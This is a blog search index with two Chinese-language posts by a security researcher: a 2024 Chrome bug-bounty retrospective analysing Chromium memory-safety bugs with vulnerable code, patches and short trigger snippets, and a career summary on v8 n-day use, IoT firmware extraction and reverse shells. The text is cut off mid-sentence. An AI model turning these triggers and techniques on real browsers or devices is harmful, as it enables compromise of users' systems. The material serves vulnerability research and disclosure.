<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2024漏洞挖掘</title>
    <link href="/2024/11/11/2024%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <url>/2024/11/11/2024%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<p>有幸拿到了今年的top chrome vrp researchers </p><p>记录2024年被带着挖的几个漏洞</p><a id="more"></a><h1 id="漏洞挖掘历程"><a href="#漏洞挖掘历程" class="headerlink" title="漏洞挖掘历程"></a>漏洞挖掘历程</h1><h2 id="CVE-2024-5171-amp-CVE-2024-5197"><a href="#CVE-2024-5171-amp-CVE-2024-5197" class="headerlink" title="CVE-2024-5171&amp;CVE-2024-5197"></a><a href="https://issues.chromium.org/issues/332382766">CVE-2024-5171&amp;CVE-2024-5197</a></h2><p>位于俩个基础库的堆溢出，由于是单独把库拉出来测的当时没有考虑到是否能在chrome内触发导致没有bug bounty。</p><p>但可能是由于libwebp事件过去不久外加这个库的应用范围广泛 cvss给了个10.0 critical评分拉满。其实当时发现chrome中无法触发应该考虑去刷其他src的。。。</p><h2 id="CVE-2024-6992"><a href="#CVE-2024-6992" class="headerlink" title="CVE-2024-6992"></a>CVE-2024-6992</h2><p>angle oob，也是和之前一样的原因 只是单独把angle库拿出来测但是没有考虑到在chrome中的情形，虽然能在mac中触发(由于mac中的chrome有个flag被启用导致触发路径可以一致)但可惜是个null pointer deference，在angle库中的确是一个oob access。</p><p>到此问题就显而易见了。真实场景中和测试场景中的路径不一致导致很多时间被浪费。吸取经验后 后续在检测策略上做了调整</p><h2 id="CVE-2024-9369"><a href="#CVE-2024-9369" class="headerlink" title="CVE-2024-9369"></a><a href="https://issues.chromium.org/issues/368208152">CVE-2024-9369</a></h2><p>后面和师兄商量了下转变了策略开始扫整个chromium。</p><p>ipcz由于边界校验不全导致的有条件且有限的越界写。</p><p>正巧赶上chrome bug bounty调整，一个oob外加高质量报告给了$35000</p><h2 id="CVE-2025-0437"><a href="#CVE-2025-0437" class="headerlink" title="CVE-2025-0437"></a>CVE-2025-0437</h2><p>共享内存 TOCTOU OOB ACCESS，写这篇博客的时候漏洞报告才上报不久，具体cve号后续更新。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xl">std::unique_ptr&lt;HistogramBase&gt; PersistentHistogramAllocator::GetHistogram(<br>    Reference ref) &#123;<br>  PersistentHistogramData* <span class="hljs-keyword">data</span> =<br>      <span class="hljs-function"><span class="hljs-title">memory_allocator_</span>-&gt;</span>GetAsObject&lt;PersistentHistogramData&gt;(ref);[<span class="hljs-number">1</span>]<br>  <span class="hljs-function"><span class="hljs-title">const</span> size_t length = memory_allocator_-&gt;</span>GetAllocSize(ref);[<span class="hljs-number">2</span>]<br><br>  <span class="hljs-function"><span class="hljs-title">if</span> (!<span class="hljs-keyword">data</span> || <span class="hljs-keyword">data</span>-&gt;</span><span class="hljs-keyword">name</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span> ||<br>      reinterpret_cast&lt;char*&gt;(<span class="hljs-keyword">data</span>)[length - <span class="hljs-number">1</span>] != <span class="hljs-string">&#x27;\0&#x27;</span> ||<br>      <span class="hljs-function"><span class="hljs-title">data</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">samples_metadata</span>.id == 0 || <span class="hljs-keyword">data</span>-&gt;</span>logged_metadata.id == <span class="hljs-number">0</span> ||<br>      (<span class="hljs-function"><span class="hljs-title">data</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">logged_metadata</span>.id != <span class="hljs-keyword">data</span>-&gt;</span>samples_metadata.id &amp;&amp;<br>       <span class="hljs-function"><span class="hljs-title">data</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">logged_metadata</span>.id != <span class="hljs-keyword">data</span>-&gt;</span>samples_metadata.id + <span class="hljs-number">1</span>) ||<br>      [<span class="hljs-number">3</span>]H<span class="hljs-function"><span class="hljs-title">ashMetricName</span>(<span class="hljs-keyword">data</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">name</span>) != <span class="hljs-keyword">data</span>-&gt;</span>samples_metadata.id) &#123;<br>    return nullptr;<br>  &#125;<br>  return CreateHistogram(<span class="hljs-keyword">data</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>具体漏洞出在[1]和[2]check和use间有个时间差可以打</p><p>打[1]处检查了size的大小必须大于0x68外加上后续<code>reinterpret_cast&lt;char*&gt;(data)[length - 1] != &#39;\0&#39;</code>的check用于保证传入HashMetricName的字符串是以0结尾的，但是在[2]处真正取到length的时候仅仅检查了size是否大于0x10 然后返回size-0x10即得到的length值。因此这里可以条件竞争pass后续的check。</p><p>在进入函数<code>HashMetricName</code>前会对参数进行strlen，由于之前的pass被绕过，字符串可以特别长以至于填充到共享内存末尾，那么strlen就会oob access到下一块共享内存，这里分为三种情况。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">如果下一块共享内存未分配即crash<br>如果下一块共享内存以<span class="hljs-number">0</span>开头则仅仅oob了下没有大影响<br>如果下一块共享内存不是以<span class="hljs-number">0</span>开头如sqlite数据库情形，那么就会返回一个大<span class="hljs-built_in">length</span>，后续HashMetricName在计算hash的时候会memcpy，导致一个oob <span class="hljs-built_in">read</span><br></code></pre></td></tr></table></figure><p>如果pass了[3]处的check那么就会进入CreateHistogram函数，这里是在计算字符串的hash和已有的hash进行比较，都是存储与共享内存中。所以‘理论上’这个check可以绕过，至于后续的CreateHistogram函数貌似没有多大影响就没看了，本想着能不能让这个oob read变成oob write的。</p><p>师兄要求太高了一定要写出完美的poc，尽可能的拿到high quality report，写出poc要做的就不止这些了，首先得找到共享内存的写入处然后分析逻辑，记录共享内存的base并写入对应的数据，然后找到句柄close处在通知broker进程处理完前创建出一个线程不断死循坏写入数据。这里还有个离谱的坑点，如果只写个死循坏写入 编译器不会报错但是会把你的代码改成int3，导致浏览器打开就卡死，加上sleep可以解决但是加上sleep后这种条件竞争的漏洞很难触发可以说几乎不可能。只能是把编译器的策略关闭才行。</p><p>也还好，写poc也能学到不少东西，有很多自己觉得很了解的东西只有在真正实践后才会发现原来还有这么多坑点。</p><p>由于是条件竞争+越界读Google给算成高度缓解，后续漏洞给了2k刀。正巧这2k刀的vrp reward直接跃升成 2024 top 20 chrome vrp researchers了。 </p><h1 id="漏洞复现历程"><a href="#漏洞复现历程" class="headerlink" title="漏洞复现历程"></a>漏洞复现历程</h1><h2 id="CVE-2024-3157"><a href="#CVE-2024-3157" class="headerlink" title="CVE-2024-3157"></a>CVE-2024-3157</h2><p>重新看了下cve-2024-3157,当初决定看mojom也是因为这个漏洞，简单来说是缺乏校验导致size的不一致造成oob，当时看到这个漏洞就提出了一个假设 mojom组件目前还是受类似的内存破坏漏洞影响。今天仔细分析了下感觉看的还是半知半解。不确定为什么触发oob时的栈回溯会那么的抽象。</p><p>整体的成因是因为image中的size和create出的shared memorysize没有校验</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">size_t byte_size = sk_bitmap.computeByteSize()<span class="hljs-comment">;</span><br>bas<span class="hljs-number">e::</span>WritableSharedMemoryRegion region =<br>    bas<span class="hljs-number">e::</span>WritableSharedMemoryRegion<span class="hljs-number">::</span>Create(byte_size)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>在gpu进程中会调用如上代码通过image的长宽高计算size然后create sharedmemory，如果gpu进程被控即可伪造较小的共享内存创建</p><p>在broker进程中调用到<code>bool StructTraits&lt;viz::mojom::BitmapInSharedMemoryDataView, SkBitmap&gt;::Read</code>反序列化函数时没有做校验导致oob</p><h2 id="CVE-2024-9954"><a href="#CVE-2024-9954" class="headerlink" title="CVE-2024-9954"></a>CVE-2024-9954</h2><p>UAF 原理是RenderFrameHost和AIManagerKeyedService生命周期的不一致加上没有miracle ptr防护。</p><p>看倒是能看懂 但是自己能不能挖出来还不好说 包括poc的编写 自己对于mojojs这块的了解还是不够深入。</p><p>iframe被创建出后首先bind mojo interface如下</p><p><code>let aiManager = new blink.mojom.AIManagerPtr(e.handle);</code></p><p>这个会触发add操作，renderframehost会被保存在broker中</p><p>后续poc中<code>removeChild</code>然后进行对应mojoapi调用<code>aiManager.createTextSession(AITextSession_receiver, undefined, undefined, []);</code>来触发uaf。</p><p>除此之外可以看到CreateSummarizer，reateWriter等函数也对receivers_.current_context()有引用</p><p>针对该漏洞的patch如下<br><a href="https://chromium-review.googlesource.com/c/chromium/src/+/5872369">https://chromium-review.googlesource.com/c/chromium/src/+/5872369</a><br>将receivers_生命周期与renderframehost绑定</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">context_bound_object_set-&gt;AddContextBoundObject(<br>      std:<span class="hljs-symbol">:make_unique&lt;AIManagerReceiverRemover&gt;</span>(<br>          base:<span class="hljs-symbol">:BindOnce</span>(<span class="hljs-name">&amp;AIManagerKeyedService</span>:<span class="hljs-symbol">:RemoveReceiver</span>,<br>                         weak_factory_.GetWeakPtr(), receiver_id)))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>当renderframehost释放时对应receiver也会释放。</p><p>后续跟进了一波发现chrome删除了这部分代码，原因是keredservice生命周期是与BrowserContext关联，超出单个document所以很容易出现uaf，外加上目前有替代方案所以直接删除了。</p><h2 id="CVE-2021-37973"><a href="#CVE-2021-37973" class="headerlink" title="CVE-2021-37973"></a>CVE-2021-37973</h2><p>uaf同样的renderframehost</p><p>从报告来看 主要问题在于CreateChildFrame函数的frame_owner_element_type参数会判断是否为kPortal 或 kFencedframe，如果是则会认为当前为一个虚拟帧。后续的RenderFrameCreated不会被调用即不会被标记为kcreate状态 后续析构时也不会通知其WebContents对象，导致其无法感知renderframehost被销毁，但是BrowserInterfaceBroker仍可以被调用用于bind接口如WakeLockService，从而导致了uaf。<br>对于这个漏洞的patch，开发人员在OnCreateChildFrame函数中增加了check，检查type是否为kPortal 或 kFencedframe。之所以要这样做是为了防止攻击者从这一条路径去创建该类frame，</p><p>正常情况下应该是通过<code>const portal = document.createElement(&#39;portal&#39;)</code>去创建，这个后续会调用到addframe，而CreateChildFrame一样，如果从CreateChildFrame出发去创建就会导致uaf，所以patch单纯是在OnCreateChildFrame中做校验。</p><h2 id="issue41486859"><a href="#issue41486859" class="headerlink" title="issue41486859"></a>issue41486859</h2><p>容器溢出 逻辑洞，dcheck相关，后续补丁改为了check。</p><p>个人感觉这类漏洞的挖掘思路是寻找异步的api，这类api可能会存在一些条件竞争的问题。具体案例复现的还不够多，可能在多来几个能总结出一些共性。</p><p>对于该漏洞就是异步api检查不够全 是 dcheck导致在release发布版中不存在使得可以出现find找不到情况出现容器溢出。以该漏洞为例</p><p>close为异步函数 定义其的mojom文件如下</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">interface</span> <span class="hljs-symbol">FileSystemAccessAccessHandleHost</span> &#123;<br>  <span class="hljs-comment">// Promises to the browser that the file and AccessHandle were closed. This</span><br>  <span class="hljs-comment">// allows the browser to release the lock held on the owning</span><br>  <span class="hljs-comment">// FileSystemFileHandle.</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-comment">// Well-behaved renderers will call this method after closing the associated</span><br>  <span class="hljs-comment">// file descriptor received by the</span><br>  <span class="hljs-comment">// FileSystemAccessFileHandle.OpenAccessHandle().</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-comment">// A compromised renderer may lie and call this method without closing its</span><br>  <span class="hljs-comment">// corresponding file descriptor. This may allow it to observe writes from</span><br>  <span class="hljs-comment">// other renderers to the same (origin-scoped) file, so no cross-origin data</span><br>  <span class="hljs-comment">// would be leaked.</span><br><span class="hljs-string">  [Sync]</span><br>  Close() =&gt; ();<br>&#125;;<br></code></pre></td></tr></table></figure><p>c++后端实现如下</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">void FileSystemAccessAccessHandleHostImpl::<span class="hljs-constructor">Close(CloseCallback <span class="hljs-params">callback</span>)</span> &#123;<br>  <span class="hljs-constructor">DCHECK_CALLED_ON_VALID_SEQUENCE(<span class="hljs-params">sequence_checker_</span>)</span>;<br>  <span class="hljs-constructor">DCHECK(!<span class="hljs-params">close_callback_</span>)</span>;<br><br>  <span class="hljs-comment">// Run `callback` when this instance is destroyed, after capacity allocation</span><br>  <span class="hljs-comment">// has been released.</span><br>  close_callback_ = base::<span class="hljs-constructor">ScopedClosureRunner(<span class="hljs-params">std</span>::<span class="hljs-params">move</span>(<span class="hljs-params">callback</span>)</span>);<br><br>  <span class="hljs-comment">// Removes `this`.</span><br>  manager_-&gt;<span class="hljs-constructor">RemoveAccessHandleHost(<span class="hljs-params">this</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先把callback复制然后remove this，this被删除后自动执行callback函数。</p><p>但是需要注意的是 这个函数是异步的所以前端可以多次调用，比如像poc里那样写成如下格式</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">access_handle_host.close()<span class="hljs-comment">;</span><br>access_handle_host.close()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>后端实现时确实写了check <code>DCHECK(!close_callback_);</code>,该check不允许close api被多次调用 会检查close_callback_值是否不为空，但这是DCHECK，release打包后会消失。现在分析这样的影响，查看后续函数调用。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FileSystemAccessManagerImpl::DidCleanupAccessHandleCapacityAllocation</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">    FileSystemAccessAccessHandleHostImpl* access_handle_host)</span> </span>&#123;<br>  DCHECK_CALLED_ON_VALID_SEQUENCE(sequence_checker_);<br>  DCHECK(access_handle_host);<br><br>  <span class="hljs-comment">// We cannot destroy `access_handle_host` by erasing it from the</span><br>  <span class="hljs-comment">// `access_handle_host_receivers_` set.</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-comment">// The destruction of a `FileSystemAccessAccessHandleHostImpl` can trigger the</span><br>  <span class="hljs-comment">// creation of another. This means that if we directly erase</span><br>  <span class="hljs-comment">// `access_handle_host` from the set, `access_handle_host_receivers_` `erase`</span><br>  <span class="hljs-comment">// could call into `access_handle_host_receivers_` `insert` (in</span><br>  <span class="hljs-comment">// `CreateAccessHandleHost`) which is undefined behavior. Instead, we&#x27;ll move</span><br>  <span class="hljs-comment">// it out of the set before erasing and then destroying.</span><br>  <span class="hljs-keyword">size_t</span> initial_size = access_handle_host_receivers_.<span class="hljs-built_in">size</span>();<br>  <span class="hljs-keyword">auto</span> iter = access_handle_host_receivers_.<span class="hljs-built_in">find</span>(access_handle_host);<br>  <span class="hljs-keyword">auto</span> access_handle_host_receiver = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">move</span>(*iter);<br>  access_handle_host_receivers_.erase(iter);<br><br>  <span class="hljs-keyword">size_t</span> count_removed = initial_size - access_handle_host_receivers_.<span class="hljs-built_in">size</span>();<br>  DCHECK_EQ(<span class="hljs-number">1u</span>, count_removed);<br>&#125;<br></code></pre></td></tr></table></figure><p>由于存在条件竞争的可能当第二次close被调用时access_handle_host大概率已经被erase，所以</p><p><code> auto iter = access_handle_host_receivers_.find(access_handle_host);</code>找不到 返回容器末尾，后续的move操作出现容器溢出。</p><p>下面看看patch</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br>void FileSystemAccessAccessHandleHostImpl::<span class="hljs-constructor">Close(CloseCallback <span class="hljs-params">callback</span>)</span> &#123;<br>  <span class="hljs-constructor">DCHECK_CALLED_ON_VALID_SEQUENCE(<span class="hljs-params">sequence_checker_</span>)</span>;<br>  <span class="hljs-keyword">if</span> (close_callback_) &#123;<br>    receiver_.<span class="hljs-constructor">ReportBadMessage(<span class="hljs-string">&quot;Close already called on SyncAccessHandle.&quot;</span>)</span>;<br>    return;<br>  &#125;<br>  <span class="hljs-comment">// Run `callback` when this instance is destroyed, after capacity allocation</span><br>  <span class="hljs-comment">// has been released.</span><br>  close_callback_ = base::<span class="hljs-constructor">ScopedClosureRunner(<span class="hljs-params">std</span>::<span class="hljs-params">move</span>(<span class="hljs-params">callback</span>)</span>);<br>  <span class="hljs-comment">// Removes `this`.</span><br>  manager_-&gt;<span class="hljs-constructor">RemoveAccessHandleHost(<span class="hljs-params">this</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>DCHECK删除改check 外加取access_handle_host时进行一次判断</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">auto iter = access_handle_host_receivers_.find(access_handle_host);<br><span class="hljs-constructor">CHECK(<span class="hljs-params">iter</span> != <span class="hljs-params">access_handle_host_receivers_</span>.<span class="hljs-params">end</span>()</span>);<br></code></pre></td></tr></table></figure><p>不确定为什么要这么个修法 感觉不是很优雅的样子</p><h2 id="CVE-2024-6988"><a href="#CVE-2024-6988" class="headerlink" title="CVE-2024-6988"></a>CVE-2024-6988</h2><p>同样是异步调用出现的问题</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">DownloadManagerTabHelper::SetCurrentDownload</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;web::DownloadTask&gt; task)</span> </span>&#123;<br>  <span class="hljs-comment">// If downloads are persistent, they cannot be lost once completed.</span><br>  <span class="hljs-keyword">if</span> (!task_ || (task_-&gt;GetState() == web::DownloadTask::State::kComplete &amp;&amp;<br>                 !WillDownloadTaskBeSavedToDrive())) &#123;<br>    <span class="hljs-comment">// The task is the first download for this web state.</span><br>    DidCreateDownload(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">move</span>(task));<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  __block <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;web::DownloadTask&gt; block_task = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">move</span>(task);<br>  [delegate_ downloadManagerTabHelper:<span class="hljs-keyword">this</span><br>              decidePolicyForDownload:block_task.<span class="hljs-built_in">get</span>()<br>                    completionHandler:^(NewDownloadPolicy policy) &#123;<br>                      <span class="hljs-keyword">if</span> (policy == kNewDownloadPolicyReplace) &#123;<br>                        DidCreateDownload(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">move</span>(block_task));<br>                      &#125;<br>                    &#125;];<br>&#125;<br></code></pre></td></tr></table></figure><p>downloadManagerTabHelper生命周期和页面相绑定 如果异步函数被调用时页面已经被关闭则会触发uaf</p><p>patch整体的逻辑没变主要是用了weakptr保证了生命周期的同步</p><p><code>base::WeakPtrFactory&lt;DownloadManagerTabHelper&gt; weak_ptr_factory_&#123;this&#125;;</code></p><h2 id="issue40057634"><a href="#issue40057634" class="headerlink" title="issue40057634"></a>issue40057634</h2><p>一样的漏洞 一样的原理 一样的patch 这俩个都是mac|ios端特有的问题，感觉是后续开发人员在将代码移植到objective c时一些编程习惯疏忽导致的一系列类似的漏洞。</p><p>这类漏洞的重点在于理解生命周期。像这个poc如下</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">&lt;input <span class="hljs-class"><span class="hljs-keyword">type</span></span>=<span class="hljs-string">&quot;color&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>触发流程首先点击触发异步调用 然后快速切换桌面 切换桌面是为了触发free，然后再切回后点击触发use，从而出现uaf。</p><p>原始函数如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">EyeDropperViewMac::EyeDropperViewMac(content::EyeDropperListener* listener)<br>    : listener_(listener) &#123;<br>  if (!listener_)<br>    return;<br>  if (@available(macOS 10.15, *)) &#123;<br>    color_sampler_.reset([[NSColorSampler alloc] init]);<br>    [color_sampler_ showSamplerWithSelectionHandler:^(NSColor* selectedColor) &#123;<br>      if (!selectedColor) &#123;<br>        listener_-&gt;ColorSelectionCanceled();<br>      &#125; else &#123;<br>        listener_-&gt;ColorSelected(skia::NSSystemColorToSkColor(selectedColor));<br>      &#125;<br>    &#125;];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>patch和之前类似 头文件中EyeDropperViewMac使用weakptr来维护+原漏洞函数逻辑不变</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs objective-c">EyeDropperViewMac::EyeDropperViewMac(content::EyeDropperListener* listener)<br>    : listener_(listener), weak_ptr_factory_(this) &#123;<br>  if (!listener_)<br>    return;<br>  if (@available(macOS 10.15, *)) &#123;<br>    color_sampler_.reset([[NSColorSampler alloc] init]);<br>    &#x2F;&#x2F; Used to ensure that EyeDropperViewMac is still alive when the handler is<br>    &#x2F;&#x2F; called.<br>    base::WeakPtr&lt;EyeDropperViewMac&gt; weak_this &#x3D; weak_ptr_factory_.GetWeakPtr();<br>    [color_sampler_ showSamplerWithSelectionHandler:^(NSColor* selectedColor) &#123;<br>      if (!weak_this)<br>        return;<br>      if (!selectedColor) &#123;<br>        listener_-&gt;ColorSelectionCanceled();<br>      &#125; else &#123;<br>        listener_-&gt;ColorSelected(skia::NSSystemColorToSkColor(selectedColor));<br>      &#125;<br>    &#125;];<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>入职两周年总结</title>
    <link href="/2024/06/27/%E5%85%A5%E8%81%8C%E4%B8%A4%E5%91%A8%E5%B9%B4%E6%80%BB%E7%BB%93/"/>
    <url>/2024/06/27/%E5%85%A5%E8%81%8C%E4%B8%A4%E5%91%A8%E5%B9%B4%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>不知不觉在阿里呆了两年了(排除实习)，写下近期的一些学习笔记和职场经验。</p><a id="more"></a><h1 id="学习-技术"><a href="#学习-技术" class="headerlink" title="学习-技术"></a>学习-技术</h1><p>在公司和学校最大的区别是<code>“公司是雇你来赚钱的而不是雇你来学习的”</code></p><p>并不是所有的部门都是研究部门，实际上一旦遇到经济下行的情况研究部门是第一个GG，被开刀子，大部分所谓的研究部门存在的意义可能就是让公司股价上升吧，告诉投资人我们公司目前还在研究一些前沿的技术以此来换取资金//个人猜测</p><p>所以在公司最重要的是把工作的方向和自己喜欢的方向尽可能找个共同点，虽然并不是很多时候都能如愿。</p><p>个人这几年学习方向</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">chrome</span> <span class="hljs-built_in">v8</span><br><span class="hljs-symbol">iot</span><br>通用IM软件逆向+漏洞挖掘<br></code></pre></td></tr></table></figure><h2 id="v8"><a href="#v8" class="headerlink" title="v8"></a>v8</h2><p>v8第一次接触是在21年实习期，这种Nday打0day的思维确实在某一个时间段很吃香，大部分软件都没有意识到开沙箱的重要性，所以往往一个xss or 想办法让其渲染页面即可达成rce。</p><p>当然v8只是一个途径，针对不同的嵌入式浏览器可能还有不同的解决办法，如<a href="https://i.blackhat.com/USA-22/Thursday/US-22-Purani-ElectroVolt-Pwning-Popular-Desktop-Apps.pdf">electron的nday</a>，jsbridge等方法都可以完成rce,v8相对来说通用些，无沙箱能渲染即可rce。</p><h2 id="iot"><a href="#iot" class="headerlink" title="iot"></a>iot</h2><p>iot这个方向就抽象了大致分为两部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">1.固件提取<br>2.功能分析<br></code></pre></td></tr></table></figure><h3 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h3><p>固件提取可以通过很多种方式，有设备的情况下拆机看芯片型号使用对应编程器去读，然后直接解包即可(遇到过一些不能解包的，后面发现是和芯片相关导致固件有特定的格式，这种情况我的解决方案是下载同样的文件系统然后对比着看猜规律，最后配合gpt一波带走)</p><p>没有设备的情况下就要去官网查了，如果提供固件没加密的话最好，加密的情况下又要分情况，一种是能模拟跑起来，那直接内核调试强行srop让其反弹shell(这个之前博客有写)，如果跑不起来就只能想办法找更老版本的固件，因为老版本不一定加密，解密后找到他加密固件的程序对其算法进行逆向即可。</p><p>如果上述条件都不满足，那我只能说gg了。</p><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><p>这里也分为两个方向，一个就是二进制层看设备监听的哪些端口然后开逆</p><p>还有就是搞他前台rce了，目前见到的大部分都是lua写的，luci框架。看源码即可，如果有遇到lua字节码的情况，找工具反编译即可，如果现成工具不能反编译，那么恭喜，大概率遇到魔改的lua解释器了，这时候就要对着源码逆向魔改的lua解释器，逆出来他到底魔改了哪里，然后对应的修改反汇编工具，个人使用的是unluac</p><p>一个小trick就是可以配个gpt，gpt在代码审计这块还是不错的，能帮助不少。</p><h2 id="通用IM软件逆向-漏洞挖掘"><a href="#通用IM软件逆向-漏洞挖掘" class="headerlink" title="通用IM软件逆向+漏洞挖掘"></a>通用IM软件逆向+漏洞挖掘</h2><p>im软件的攻击面相对来说很多，但是如果以”实战”为目标的话就少了。</p><p>目前最常见的就是浏览器相关，要么就是v8打要么就是想办法js bridge了。</p><p>关于js 